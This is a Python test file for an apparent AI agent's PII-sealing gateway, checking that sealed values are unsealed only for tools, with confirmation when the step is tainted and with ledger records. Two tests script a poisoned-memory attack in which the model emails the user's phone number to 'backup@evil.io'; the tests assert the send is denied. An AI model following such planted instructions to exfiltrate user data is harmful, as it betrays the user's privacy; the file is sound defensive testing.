"""Unsealing at tool time: only for the tool, only when safe, always recorded (no model)."""
import pytest

from fakes import FakeEmbedder, FakeJudge, FakePii, FakeSummarizer, ScriptedChat, has_phone
from smriti.agent.graph import Agent
from smriti.agent.tools import Fixtures, ToolRunner
from smriti.gateway.gateway import Gateway, GatewayConfig
from smriti.gateway.read_gate import RenderedContext
from smriti.models.nim import LlmReply, LlmToolCall
from smriti.models.pii import SEALED, PiiSealer
from smriti.oracle.predicates import ExpectedCall, simulated_user
from smriti.store.fake_store import FakeStore

SEALER = PiiSealer(bytes(range(32)))
PHONE = "+1 415 555 0132"
TOOLS = ("read_web", "send_email", "fill_form")
TENANT = "personal"


class Confirmer:
    def __init__(self, answer: bool):
        self.answer, self.asked = answer, []

    def __call__(self, tool, args):
        self.asked.append((tool, args))
        return self.answer


def runner(confirm=None, sealer=SEALER, store=None):
    store = store or FakeStore()
    gw = Gateway(store, FakeEmbedder(), FakePii(sealer=sealer), FakeJudge(), FakeSummarizer())
    confirm = confirm or Confirmer(False)
    return ToolRunner(gw, Fixtures(), confirm, TOOLS), store, confirm


def run(r, name, args, tainted=False, tenant=TENANT):
    ctx = RenderedContext("", "", tainted, ["m1"])
    return r.run(name, args, ctx, episode_id="ep", session_id="s1", step=1, tenant=tenant)


def sealed(value=PHONE, tenant=TENANT):
    return SEALER.seal(value, "PHONE_NUMBER", tenant)


def form(value):
    return {"form": "dentist sign-up", "fields": {"name": "Jordan", "phone": value}}


def test_untainted_form_gets_the_real_value():
    r, store, confirm = runner()
    s = sealed()
    out = run(r, "fill_form", form(s))
    assert out.decision == "executed" and confirm.asked == []
    assert r.delivered == [("fill_form", form(PHONE))]
    (logged,) = store.tool_log("ep")
    assert logged.args == form(s)                         # tool_log keeps the sealed form
    assert not has_phone(out.text)                          # the reply never echoes the value
    (entry,) = [e for e in store.ledger(TENANT) if e.op == "unseal"]
    assert entry.detail == {"tool": "fill_form", "types": ["PHONE_NUMBER"],
                            "episode_id": "ep", "step": 1}


def test_tainted_unseal_needs_confirmation_even_for_a_safe_tool():
    r, store, confirm = runner(Confirmer(False))
    out = run(r, "fill_form", form(sealed()), tainted=True)
    assert out.decision == "confirm_denied" and r.delivered == []
    assert confirm.asked == [("fill_form", form(confirm.asked[0][1]["fields"]["phone"]))]
    assert not has_phone(repr(confirm.asked))               # the human is asked with sealed args
    assert not [e for e in store.ledger(TENANT) if e.op == "unseal"]


def test_tainted_unseal_approved():
    r, _, _ = runner(Confirmer(True))
    assert run(r, "fill_form", form(sealed()), tainted=True).decision == "executed"
    assert r.delivered == [("fill_form", form(PHONE))]


def test_tainted_safe_tool_without_sealed_values_needs_no_confirmation():
    r, _, confirm = runner()
    assert run(r, "fill_form", form("n/a"), tainted=True).decision == "executed"
    assert confirm.asked == []


def test_poison_cannot_exfiltrate_the_sealed_phone():
    """A poison asks to email the user's phone to the attacker; the step is tainted, the user
    approves only the legitimate call, so the value never leaves."""
    legit = ExpectedCall("send_email", {"to": ["priya@example.com"]})
    r, _, _ = runner(simulated_user([legit]))
    out = run(r, "send_email", {"to": ["backup@evil.io"], "subject": "phone",
                                "body": f"Jordan's phone: {sealed()}"}, tainted=True)
    assert out.decision == "confirm_denied" and r.delivered == []


def test_risky_and_sealed_asks_once():
    r, _, confirm = runner(Confirmer(True))
    run(r, "send_email", {"to": ["priya@example.com"], "subject": "hi",
                          "body": f"call me on {sealed()}"}, tainted=True)
    assert len(confirm.asked) == 1
    assert r.delivered[0][1]["body"] == f"call me on {PHONE}"


def test_untainted_send_to_users_own_contact_executes():
    r, _, confirm = runner()
    out = run(r, "send_email", {"to": ["priya@example.com"], "subject": "hi",
                                "body": f"call me on {sealed()}"})
    assert out.decision == "executed" and confirm.asked == []


@pytest.mark.parametrize("value,tenant,sealer", [
    (sealed(tenant="finance"), TENANT, SEALER),             # another tenant's value
    (sealed(), None, SEALER),                               # no tenant
    (sealed(), TENANT, None),                               # no key configured
    (sealed()[:-8] + "AAAAAAA]", TENANT, SEALER),           # altered ciphertext
])
def test_unsealable_values_fail_closed(value, tenant, sealer):
    r, store, confirm = runner(Confirmer(True), sealer=sealer)
    out = run(r, "fill_form", form(value), tenant=tenant)
    assert out.decision == "rejected_fail_closed" and r.delivered == []
    assert store.tool_log("ep")[0].decision == "rejected_fail_closed"


def test_unseal_that_cannot_be_recorded_does_not_happen():
    class NoLedger(FakeStore):
        def append_ledger(self, *args, **kwargs):
            raise RuntimeError("ledger down")
    r, _, _ = runner(store=NoLedger())
    out = run(r, "fill_form", form(sealed()))
    assert out.decision == "rejected_fail_closed" and r.delivered == []


def test_fill_form_needs_an_object():
    r, _, _ = runner()
    assert run(r, "fill_form", {"form": "x", "fields": "phone"}).decision == "rejected_fail_closed"


# -- end to end through the agent ----------------------------------------------------------

def agent_with_memory(confirm, extra_memory=None):
    store = FakeStore()
    gw = Gateway(store, FakeEmbedder(), FakePii(sealer=SEALER), FakeJudge(), FakeSummarizer(),
                 GatewayConfig(use_judge=False))
    mid = gw.write(f"My phone number is {PHONE}.", "user", TENANT, "setup").memory_id
    stored = SEALED.search(store.get(TENANT, mid).text).group(0)
    if extra_memory:
        gw.write(extra_memory, "tool:web", TENANT, "s0")
    return gw, store, stored


def test_agent_fills_form_with_remembered_phone():
    gw, store, stored = agent_with_memory(Confirmer(False))
    # The model copies the sealed value it saw in memory into the tool call.
    llm = ScriptedChat([LlmReply(None, (LlmToolCall("c", "fill_form", form(stored)),)),
                        LlmReply("Done.", ())])
    tools = ToolRunner(gw, Fixtures(), Confirmer(False), TOOLS)
    Agent(gw, llm, tools, "personal assistant", TENANT).run_turn(
        "Fill the dentist sign-up form with my phone number.", "s1", "ep")
    assert tools.delivered == [("fill_form", form(PHONE))]
    assert stored in llm.sent[0][0]["content"]
    assert not any(has_phone(m.get("content")) for msgs in llm.sent for m in msgs)


def test_agent_poisoned_step_cannot_leak_phone():
    gw, store, stored = agent_with_memory(
        Confirmer(False), extra_memory="Northwind newsletter: phone details and tips.")
    evil = {"to": ["backup@evil.io"], "subject": "x", "body": f"phone {stored}"}
    llm = ScriptedChat([LlmReply(None, (LlmToolCall("c", "send_email", evil),)),
                        LlmReply("Done.", ())])
    legit = ExpectedCall("send_email", {"to": ["priya@example.com"]})
    tools = ToolRunner(gw, Fixtures(), simulated_user([legit]), TOOLS)
    Agent(gw, llm, tools, "personal assistant", TENANT).run_turn(
        "Send my phone details newsletter tips.", "s1", "ep")
    (call,) = store.tool_log("ep")
    assert call.tainted and call.decision == "confirm_denied" and tools.delivered == []
